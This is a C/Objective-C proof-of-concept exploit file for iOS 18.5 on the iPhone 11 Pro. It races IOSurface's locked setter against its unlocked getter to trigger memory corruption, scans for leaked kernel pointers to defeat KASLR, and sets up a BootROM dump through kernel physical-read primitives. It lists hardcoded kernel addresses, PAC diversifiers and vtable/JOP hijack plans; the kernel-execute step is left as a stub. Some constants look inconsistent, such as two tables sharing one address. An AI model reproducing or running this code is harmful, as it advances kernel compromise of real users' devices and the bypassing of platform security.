/*
 * iOS 18.5 (22F76) — Chain B PoC v3: IOSurface Race → Kernel R/W → BootROM Dump
 * Target: iPhone 11 Pro (iPhone12,3) / A13 Bionic (T8030)
 * 
 * ═══════════════════════════════════════════════════════════════════
 * Phase 13d CRITICAL FINDING:
 *   ml_phys_read_core ALREADY handles non-DRAM physical addresses!
 *   BootROM at phys 0x100000000 uses the SLOW PATH:
 *     → PPL physwindow mapping (no gPhysBase patching needed!)
 *   Just call ml_phys_read_double(0x100000000 + offset) directly.
 * ═══════════════════════════════════════════════════════════════════
 *
 * Corrected Phase 10 Analysis:
 *   - s_set_value IS LOCKED (BL-based lock at 0xa651770)
 *   - s_get_value has NO LOCK — 6 vtable dispatches unprotected
 *   - Attack: race locked setter vs unlocked getter = type confusion
 *
 * Phase 11+13d Kernel Primitives:
 *   - ml_phys_read_core:  0xfffffff00807b4f8 (113 insns, 2 paths)
 *     → FAST PATH: for DRAM addrs, calls phystokv-like (0x8077158)
 *     → SLOW PATH: for non-DRAM, calls PPL physwindow (0x7ef708c)
 *   - [0x7a6cbb8] = gPhysBase (runtime: 0x800000000 = DRAM base)
 *   - [0x7a6cbc0] = gPhysEnd  (runtime: 0x900000000 = gPhysBase+Size)
 *     ^^^ CORRECTED: this is gPhysEnd, NOT gPhysSize!
 *
 * Build: clang -framework IOKit -framework CoreFoundation -o chain_b chain_b_ios185_v3.m
 */

#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <pthread.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>

// ═══════════════════════════════════════════════════════════════════
// iOS 18.5 Kernel Addresses (pre-KASLR, add slide at runtime)
// ═══════════════════════════════════════════════════════════════════

#define KC_BASE                 0xfffffff007004000ULL

// IOSurface kext
#define IOSURFACE_TEXT_START    0xfffffff009e676d0ULL
#define IOSURFACE_TEXT_END      0xfffffff009e954c8ULL
#define DISPATCH_TABLE_VA       0xfffffff007e56618ULL  // 63 entries, 24-byte stride
#define VTABLE_VA               0xfffffff007e56618ULL  // 777 PAC-IA signed entries

// Dispatch handler addresses (selector → function)
#define S_CREATE_SURFACE        0xfffffff009e86024ULL  // sel 0  [NO LOCK]
#define S_DELETE_SURFACE        0xfffffff0084ff664ULL  // sel 1
#define S_LOOKUP_SURFACE        0xfffffff0084ff418ULL  // sel 2
#define S_LOCK_SURFACE          0xfffffff0084ff390ULL  // sel 3
#define S_UNLOCK_SURFACE        0xfffffff0085630e8ULL  // sel 4  [NO LOCK]
#define S_GET_VALUE             0xfffffff00857f3a4ULL  // sel 5  [NO LOCK !!]
#define S_SET_VALUE             0xfffffff00857ee7cULL  // sel 6  [LOCKED via BL]
#define S_INCREMENT_USE         0xfffffff00861c8d0ULL  // sel 7  [NO LOCK]
#define S_DECREMENT_USE         0xfffffff00857e464ULL  // sel 8  [NO LOCK]
#define S_SET_VALUE_XML         0xfffffff00857e1acULL  // sel 9  [NO LOCK]
#define S_GET_VALUE_XML         0xfffffff00857dde8ULL  // sel 10 [NO LOCK]
#define S_BULK_SET_VALUE        0xfffffff00857dba0ULL  // sel 11 [NO LOCK]
#define S_BULK_GET_VALUE        0xfffffff00857d83cULL  // sel 12 [NO LOCK]

// Lock functions
#define LOCK_ACQUIRE_FUNC       0xfffffff007f4bc20ULL
#define LOCK_RELEASE_FUNC       0xfffffff007f4c894ULL
#define IOSURFACE_GLOBAL_LOCK   0xfffffff00a651770ULL

// PAC Diversities
#define PAC_VTABLE_AUTH         0xcda1  // DA key — vtable pointer authentication
#define PAC_RETAIN              0x2e4a  // IA key — vtable+0x20
#define PAC_RELEASE             0x3a87  // IA key — vtable+0x28
#define PAC_SET_CONTAINER       0x5837  // vtable+0x128 (property container lookup)
#define PAC_SET_PROPERTY        0x8453  // vtable+0x118 (property setter)
#define PAC_GET_PROPERTY        0x5a20  // vtable+0x148 (property getter)
#define PAC_GET_HELPER          0x4a6a  // vtable+0x68  (helper)
#define PAC_GET_ALLOC           0x1ac8  // allocation helper
#define PAC_XML_HANDLER         0x4578  // s_set_value_xml handler (DIFFERENT!)

// ═══════════════════════════════════════════════════════════════════
// PHYSICAL MEMORY PRIMITIVES (Phase 11 + Phase 13d corrections)
// ═══════════════════════════════════════════════════════════════════

// ml_phys_read wrappers (just set size in w1, call core)
#define ML_PHYS_READ_CORE       0xfffffff00807b4f8ULL  // 113 insns, handles ALL phys addrs
#define ML_PHYS_READ_DATA       0xfffffff00807b738ULL  // w1=4, reads 4 bytes
#define ML_PHYS_READ_HALF       0xfffffff00807b754ULL  // w1=2, reads 2 bytes
#define ML_PHYS_READ_BYTE       0xfffffff00807b770ULL  // w1=1, reads 1 byte
#define ML_PHYS_READ_DOUBLE     0xfffffff00807b78cULL  // w1=8, reads 8 bytes ← BEST FOR BOOTROM
#define ML_PHYS_WRITE_CORE      0xfffffff00807b7a8ULL

// ml_phys_read_core sub-functions:
#define PHYS_TO_PHYSMAP_VA      0xfffffff008077158ULL  // fast path: DRAM phys→VA (31 insns)
#define PMAP_ATTR_LOOKUP        0xfffffff008070e8cULL  // slow path: attribute lookup (47 insns)
#define PPL_ENTER_PHYSWINDOW    0xfffffff007ef708cULL  // PPL trampoline: x15=0xf → 0x7eec070
#define PPL_REMOVE_PHYSWINDOW   0xfffffff007ef70fcULL  // PPL trampoline: x15=0x1f → 0x7eec070
#define PPL_DISPATCHER          0xfffffff007eec070ULL  // PPL handler entry point

// Global variables (kernel __DATA)
#define G_PHYS_BASE             0xfffffff007a6cbb8ULL  // gPhysBase (runtime: 0x800000000)
#define G_PHYS_END              0xfffffff007a6cbc0ULL  // gPhysEnd = gPhysBase+Size (0x900000000)
//      ^^^ CORRECTED: was labeled gPhysSize, actually stores gPhysBase+gPhysSize
#define PV_HEAD_TABLE           0xfffffff007a46d28ULL
#define PHYSMAP_BASE_CONST      0xfffffffbffd00000ULL

// phystokv region table: 3 entries at [0x7a48010], each 24 bytes (base, va_off, size)
#define PHYSTOKV_REGION_TABLE   0xfffffff007a48010ULL
// phystokv and kvtophys
#define PHYSTOKV_FUNC           0xfffffff0080772c8ULL  // 55 insns, panic for unknown regions
#define KVTOPHYS_FUNC           0xfffffff008066510ULL  // 90 insns, bounds-checked

// ═══════════════════════════════════════════════════════════════════
// BOOTROM TARGET
// ═══════════════════════════════════════════════════════════════════

#define T8030_BOOTROM_PHYS      0x100000000ULL  // A13 SecureROM start
#define T8030_BOOTROM_SIZE      0x80000         // 512 KB (to 0x100080000)

/*
 * ml_phys_read_core flow for BootROM (0x100000000):
 *
 *  1. Page crossing check → OK (8 bytes within same 16KB page)
 *  2. Bounds check: 0x100000000 NOT in [gPhysBase=0x800000000, gPhysEnd=0x900000000)
 *     → w21=1 (non-DRAM), falls through to SLOW PATH
 *  3. Disable preemption
 *  4. Second bounds check (page-level): also outside → branch to 0x807b5d8
 *  5. BL pmap_attr_lookup(0x8070e8c) → returns NULL for BootROM
 *  6. Default: w2=7 (device memory, non-cacheable)
 *  7. BL ppl_enter_physwindow(0x7ef708c): PPL creates temp PTE for phys page
 *  8. Compute VA in per-CPU physmap window
 *  9. ldr x20, [VA] → READ 8 bytes of BootROM
 * 10. BL ppl_remove_physwindow(0x7ef70fc): PPL unmaps temp PTE
 * 11. Re-enable preemption
 * 12. Return x20 (8 bytes of BootROM data)
 *
 * NO gPhysBase PATCHING REQUIRED. Each read is atomic (preemption disabled).
 * Hardware: A13 has no GXF → BootROM likely readable from EL1 via AMCC.
 */

// ═══════════════════════════════════════════════════════════════════
// Race Condition Data Structures
// ═══════════════════════════════════════════════════════════════════

typedef struct {
    io_connect_t connection;
    uint32_t surface_id;
    volatile int running;
    volatile uint64_t race_count;
    volatile uint64_t crash_count;
    uint64_t kaslr_slide;
} race_ctx_t;

static race_ctx_t g_ctx = {0};

// ═══════════════════════════════════════════════════════════════════
// IOSurface External Method Helpers
// ═══════════════════════════════════════════════════════════════════

kern_return_t set_surface_value(io_connect_t conn, uint32_t surface_id,
                                 uint32_t key, void *data, size_t len) {
    uint64_t input[4] = {surface_id, key, 0, len};
    return IOConnectCallMethod(conn, 6, input, 4, data, len,
                               NULL, NULL, NULL, NULL);
}

kern_return_t get_surface_value(io_connect_t conn, uint32_t surface_id,
                                 uint32_t key, void *out, size_t *out_len) {
    uint64_t input[2] = {surface_id, key};
    uint32_t out_cnt = 0;
    return IOConnectCallMethod(conn, 5, input, 2, NULL, 0,
                               NULL, &out_cnt, out, out_len);
}

kern_return_t set_surface_value_xml(io_connect_t conn, uint32_t surface_id,
                                     void *xml_data, size_t xml_len) {
    uint64_t input[1] = {surface_id};
    return IOConnectCallMethod(conn, 9, input, 1, xml_data, xml_len,
                               NULL, NULL, NULL, NULL);
}

// ═══════════════════════════════════════════════════════════════════
// RACE THREADS
// ═══════════════════════════════════════════════════════════════════

/*
 * ATTACK VECTOR: Lock asymmetry
 *
 * s_set_value (LOCKED):
 *   BL lock_acquire(0xa651770)
 *   vtable+0x128(obj, key)  → container lookup (PAC div 0x5837)
 *   vtable+0x118(res, 0)    → property set    (PAC div 0x8453)
 *   vtable+0x20(res)        → retain          (PAC div 0x2e4a)
 *   BL lock_release(0xa651770)
 *
 * s_get_value (UNLOCKED!!!):
 *   vtable+0x148(self, key) → property get    (PAC div 0x5a20)
 *   vtable+0x68(res)        → helper          (PAC div 0x4a6a)
 *   vtable+0x20(res)        → retain          (PAC div 0x2e4a)
 *   vtable+0x28(old)        → release         (PAC div 0x3a87)
 *   (6 total vtable dispatches, ALL without lock)
 *
 * RACE: getter reads property container while setter replaces it
 * → stale/freed pointer → UAF or type confusion info leak
 */

void *setter_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    
    uint8_t small_data[16];
    memset(small_data, 0x41, 8);
    memset(small_data + 8, 0x42, 8);
    
    const char *xml_payload = 
        "<?xml version=\"1.0\"?>"
        "<dict>"
        "<key>IOSurfaceRaceKey</key>"
        "<dict>"
        "<key>A</key><integer>0x4141414141414141</integer>"
        "<key>B</key><data>QUFBQUFBQUFCQUJCQUJCQQ==</data>"
        "</dict>"
        "</dict>";
    size_t xml_len = strlen(xml_payload);
    
    while (ctx->running) {
        for (int i = 0; i < 100; i++)
            set_surface_value(ctx->connection, ctx->surface_id,
                            0x1337, small_data, sizeof(small_data));
        for (int i = 0; i < 100; i++)
            set_surface_value_xml(ctx->connection, ctx->surface_id,
                                (void *)xml_payload, xml_len);
        ctx->race_count += 200;
    }
    return NULL;
}

void *getter_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    uint8_t output[4096];
    size_t out_len;
    
    while (ctx->running) {
        out_len = sizeof(output);
        kern_return_t kr = get_surface_value(ctx->connection, ctx->surface_id,
                                              0x1337, output, &out_len);
        if (kr == KERN_SUCCESS && out_len > 0) {
            // Scan for kernel pointer leak (0xfffffff0...)
            for (size_t i = 0; i + 8 <= out_len; i += 8) {
                uint64_t val = *(uint64_t *)(output + i);
                if ((val >> 40) == 0xFFFFFF) {
                    printf("[!] KERNEL POINTER LEAK @ out[%zu]: 0x%llx\n", i, val);
                    if (val > KC_BASE && val < KC_BASE + 0x100000000ULL) {
                        uint64_t slide = (val - KC_BASE) & ~0xFFFULL;
                        printf("[+] KASLR slide candidate: 0x%llx\n", slide);
                        ctx->kaslr_slide = slide;
                    }
                }
            }
            if (out_len > 256)
                printf("[!] SUSPICIOUS output length: %zu\n", out_len);
        }
        ctx->race_count++;
    }
    return NULL;
}

void *decrement_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (ctx->running) {
        uint64_t input[1] = {ctx->surface_id};
        IOConnectCallMethod(ctx->connection, 8, input, 1, NULL, 0,
                           NULL, NULL, NULL, NULL);
        IOConnectCallMethod(ctx->connection, 7, input, 1, NULL, 0,
                           NULL, NULL, NULL, NULL);
        ctx->race_count += 2;
    }
    return NULL;
}

// ═══════════════════════════════════════════════════════════════════
// IOSurface Setup
// ═══════════════════════════════════════════════════════════════════

io_connect_t open_iosurface(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                            IOServiceMatching("IOSurfaceRoot"));
    if (!service) { printf("[-] IOSurfaceRoot not found\n"); return 0; }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) { printf("[-] IOServiceOpen: 0x%x\n", kr); return 0; }
    return conn;
}

uint32_t create_surface(io_connect_t conn) {
    const char *props_xml = 
        "<?xml version=\"1.0\"?>"
        "<dict>"
        "<key>IOSurfaceWidth</key><integer>32</integer>"
        "<key>IOSurfaceHeight</key><integer>32</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceAllocSize</key><integer>4096</integer>"
        "</dict>";
    
    uint64_t output[1] = {0};
    uint32_t output_cnt = 1;
    kern_return_t kr = IOConnectCallMethod(conn, 0, NULL, 0,
                                            (void *)props_xml, strlen(props_xml),
                                            output, &output_cnt, NULL, NULL);
    if (kr != KERN_SUCCESS) { printf("[-] create_surface: 0x%x\n", kr); return 0; }
    return (uint32_t)output[0];
}

// ═══════════════════════════════════════════════════════════════════
// Phase D: BootROM Dump (65,536 × ml_phys_read_double calls)
// ═══════════════════════════════════════════════════════════════════

/*
 * kexec_phys_read_double: call ml_phys_read_double(paddr) from kernel context.
 *
 * After achieving kernel R/W via IOSurface race + heap feng shui:
 * Option 1: Corrupt IOSurface dispatch table entry to point to 
 *           ml_phys_read_double. IOSurface external method call
 *           forwards x0 (first input scalar) as paddr.
 *
 * Option 2: JOP chain through s_get_value's 6 unlocked vtable calls.
 *           Redirect vtable+0x148 (PAC div 0x5a20) to gadget that
 *           pivots x0 to controlled paddr, then calls ml_phys_read_double.
 *
 * In either case: the kernel's ml_phys_read_core handles BootROM via
 * the SLOW PATH → PPL physwindow → temp mapping → read → unmap.
 * Zero global state modification. Thread-safe. Atomic.
 */
uint64_t kexec_phys_read_double(uint64_t slide, uint64_t paddr) {
    // STUB: Replace with actual kernel execute mechanism
    // After building kexec primitive via vtable corruption:
    //
    // uint64_t ml_phys_read_double_slid = ML_PHYS_READ_DOUBLE + slide;
    // return kexec(ml_phys_read_double_slid, paddr);
    //
    // ml_phys_read_double is just 7 instructions:
    //   pacibsp
    //   stp x29, x30, [sp, #-0x10]!
    //   mov x29, sp
    //   mov w1, #8
    //   bl  ml_phys_read_core   ← handles both DRAM and non-DRAM!
    //   ldp x29, x30, [sp], #0x10
    //   retab
    
    (void)slide; (void)paddr;
    return 0; // TODO: implement kexec
}

void dump_bootrom(uint64_t slide) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════╗\n");
    printf(" A13 (T8030) SecureROM Dump — Physical 0x%llx          ║\n", T8030_BOOTROM_PHYS);
    printf("═══════════════════════════════════════════════════════════╝\n");
    printf("[*] KASLR slide:            0x%llx\n", slide);
    printf("[*] ml_phys_read_double:    0x%llx (slid)\n", ML_PHYS_READ_DOUBLE + slide);
    printf("[*] PPL enter_physwindow:   0x%llx (slid)\n", PPL_ENTER_PHYSWINDOW + slide);
    printf("[*] PPL remove_physwindow:  0x%llx (slid)\n", PPL_REMOVE_PHYSWINDOW + slide);
    printf("[*] gPhysBase:              0x%llx (slid)\n", G_PHYS_BASE + slide);
    printf("[*] gPhysEnd:               0x%llx (slid)\n", G_PHYS_END + slide);
    printf("\n");
    printf("[*] Strategy: direct ml_phys_read_double — NO gPhysBase patch!\n");
    printf("[*] ml_phys_read_core slow path handles non-DRAM addrs via PPL\n");
    printf("[*] BootROM phys 0x100000000 → PPL maps temp PTE → reads 8 bytes → unmaps\n");
    printf("\n");
    
    FILE *f = fopen("t8030_bootrom_ios185.bin", "wb");
    if (!f) {
        printf("[-] Failed to open output file\n");
        return;
    }
    
    uint32_t total = T8030_BOOTROM_SIZE / 8;  // 65,536 reads
    uint32_t dumped = 0;
    
    for (uint64_t off = 0; off < T8030_BOOTROM_SIZE; off += 8) {
        uint64_t phys = T8030_BOOTROM_PHYS + off;
        uint64_t val = kexec_phys_read_double(slide, phys);
        fwrite(&val, 8, 1, f);
        dumped++;
        
        if ((dumped & 0x1FFF) == 0) {
            printf("\r[*] Dumping... %u/%u (%.1f%%)",
                   dumped, total, (float)dumped / total * 100.0f);
            fflush(stdout);
        }
        
        // First 8 bytes of A13 BootROM should be ARM64 instructions
        // Typically starts with exception vector or reset handler
        if (off == 0) {
            printf("[*] First 8 bytes: %016llx\n", val);
            if (val == 0) {
                printf("[!] WARNING: Read returned 0 — AMCC may be blocking access\n");
                printf("[!] Try: check AMCC filter registers at 0x200000000\n");
                // Don't abort — might be valid (BootROM could start with NOP)
            }
        }
    }
    
    fclose(f);
    printf("\r[+] BootROM dumped: t8030_bootrom_ios185.bin (%u bytes, %u reads)\n",
           T8030_BOOTROM_SIZE, dumped);
    printf("[+] SHA-256 it and compare with known T8030 SecureROM hashes\n");
}

// ═══════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════

int main(int argc, char **argv) {
    printf("═══════════════════════════════════════════════════════════════\n");
    printf(" iOS 18.5 (22F76) Chain B v3 — IOSurface Lock Asymmetry Race\n");
    printf(" Target: iPhone 11 Pro / A13 (T8030)\n");
    printf(" Phase 13d: ml_phys_read handles BootROM via PPL physwindow\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");
    
    printf("[*] Attack: s_set_value (LOCKED@0x%llx) vs s_get_value (UNLOCKED)\n\n",
           IOSURFACE_GLOBAL_LOCK);
    
    io_connect_t conn = open_iosurface();
    if (!conn) return 1;
    printf("[+] IOSurface connection: 0x%x\n", conn);
    
    uint32_t sid = create_surface(conn);
    if (!sid) return 1;
    printf("[+] Surface ID: %u\n", sid);
    
    uint8_t init[64];
    memset(init, 0x43, sizeof(init));
    set_surface_value(conn, sid, 0x1337, init, sizeof(init));
    printf("[+] Initial property set (key=0x1337)\n");
    
    g_ctx = (race_ctx_t){
        .connection = conn, .surface_id = sid,
        .running = 1, .race_count = 0, .kaslr_slide = 0
    };
    
    printf("\n[*] Launching race threads:\n");
    printf("    Thread A: setter (locked binary + unlocked XML)\n");
    printf("    Thread B×2: getter (UNLOCKED, 6 vtable dispatches)\n\n");
    
    pthread_t t_set, t_get1, t_get2;
    pthread_create(&t_set,  NULL, setter_thread,  &g_ctx);
    pthread_create(&t_get1, NULL, getter_thread,  &g_ctx);
    pthread_create(&t_get2, NULL, getter_thread,  &g_ctx);
    
    for (int i = 0; i < 60; i++) {
        sleep(1);
        printf("\r[*] Racing... %llu ops  ", g_ctx.race_count);
        fflush(stdout);
        if (g_ctx.kaslr_slide) {
            printf("\n[!!!] KASLR SLIDE: 0x%llx\n", g_ctx.kaslr_slide);
            g_ctx.running = 0;
            break;
        }
    }
    
    g_ctx.running = 0;
    pthread_join(t_set, NULL);
    pthread_join(t_get1, NULL);
    pthread_join(t_get2, NULL);
    
    printf("\n[*] Total operations: %llu\n", g_ctx.race_count);
    
    if (g_ctx.kaslr_slide) {
        printf("\n[+] Resolved key addresses (slid):\n");
        printf("    ml_phys_read_double:  0x%llx\n", ML_PHYS_READ_DOUBLE + g_ctx.kaslr_slide);
        printf("    ml_phys_write_core:   0x%llx\n", ML_PHYS_WRITE_CORE + g_ctx.kaslr_slide);
        printf("    gPhysBase:            0x%llx\n", G_PHYS_BASE + g_ctx.kaslr_slide);
        printf("    gPhysEnd:             0x%llx\n", G_PHYS_END + g_ctx.kaslr_slide);
        printf("    PPL dispatcher:       0x%llx\n", PPL_DISPATCHER + g_ctx.kaslr_slide);
        
        dump_bootrom(g_ctx.kaslr_slide);
    } else {
        printf("\n[-] No KASLR slide found. Retry with more threads or timing.\n");
    }
    
    IOServiceClose(conn);
    return 0;
}
